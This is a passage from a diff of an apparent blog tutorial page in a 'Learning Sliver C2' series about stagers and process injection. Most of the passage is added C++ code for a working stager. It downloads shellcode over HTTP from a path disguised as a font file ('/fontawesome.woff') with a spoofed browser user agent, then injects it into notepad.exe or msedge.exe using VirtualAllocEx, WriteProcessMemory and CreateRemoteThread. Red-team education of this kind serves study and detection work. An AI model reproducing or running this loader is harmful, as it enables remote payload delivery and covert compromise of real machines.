+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&#34;</span>,
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL,
+        NULL,
+        <span style="color:#ae81ff">0</span>);
+
+    HINTERNET connection <span style="color:#f92672">=</span> InternetConnect(
+        session,
+        host,
+        port,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>,
+        INTERNET_SERVICE_HTTP,
+        <span style="color:#ae81ff">0</span>,
+        <span style="color:#ae81ff">0</span>);
+
+    HINTERNET request <span style="color:#f92672">=</span> HttpOpenRequest(
+        connection,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;GET&#34;</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/fontawesome.woff&#34;</span>,
+        NULL,
+        NULL,
+        NULL,
+        <span style="color:#ae81ff">0</span>,
+        <span style="color:#ae81ff">0</span>);
+
+    WORD counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>HttpSendRequest(request, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
+        counter<span style="color:#f92672">++</span>;
+        Sleep(<span style="color:#ae81ff">3000</span>);
+        <span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// HTTP requests eventually failed
+</span><span style="color:#75715e"></span>        }
+    }
+
+    DWORD bufSize <span style="color:#f92672">=</span> BUFSIZ;
+    BYTE<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BYTE[bufSize];
+
+    DWORD capacity <span style="color:#f92672">=</span> bufSize;
+    BYTE<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)malloc(capacity);
+
+    DWORD payloadSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">while</span> (true) {
+        DWORD bytesRead;
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>InternetReadFile(request, buffer, bufSize, <span style="color:#f92672">&amp;</span>bytesRead)) {
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+
+        <span style="color:#66d9ef">if</span> (bytesRead <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+
+        <span style="color:#66d9ef">if</span> (payloadSize <span style="color:#f92672">+</span> bytesRead <span style="color:#f92672">&gt;</span> capacity) {
+            capacity <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
+            BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, capacity);
+            payload <span style="color:#f92672">=</span> newPayload;
+        }
+
+        <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>) {
+            payload[payloadSize<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> buffer[i];
+        }
+
+    }
+    BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, payloadSize);
+
+    InternetCloseHandle(request);
+    InternetCloseHandle(connection);
+    InternetCloseHandle(session);
+
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> payload;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> payloadSize;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#75715e">// ------ Finding a target process ------ //
+</span><span style="color:#75715e"></span>
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            <span style="color:#75715e">//printf(&#34;Process found: %d %ls\n&#34;, pid, pe32.szExeFile);
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+
+<span style="color:#75715e">// ------ Injecting into process ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div>
     </div>
     
     <footer>
@@ -1449,7 +1450,7 @@ and all print statements removed.</p>
   
     and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/process-injection/">process injection</a>, <a href="/tags/sliver/">sliver</a>, <a href="/tags/stagers/">stagers</a>, <a href="/tags/sysmon/">sysmon</a> and <a href="/tags/tutorial/">tutorial</a>
   
-  using <span itemprop="wordCount">4453</span> words.
+  using <span itemprop="wordCount">4619</span> words.
 </p>
 
       
@@ -1460,19 +1461,19 @@ and all print statements removed.</p>
     <ul>
       
         <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
-        <time datetime="25M">25 minutes</time>
+        <time datetime="26M">26 minutes</time>
       
         <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
         <time datetime="9M">9 minutes</time>
       
         <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
-        <time datetime="18M">18 minutes</time>
+        <time datetime="19M">19 minutes</time>
       
         <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
         <time datetime="11M">11 minutes</time>
       
         <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
-        <time datetime="13M">13 minutes</time>
+        <time datetime="14M">14 minutes</time>
       
         <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Tutorial / Installation</a>
         <time datetime="8M">8 minutes</time>
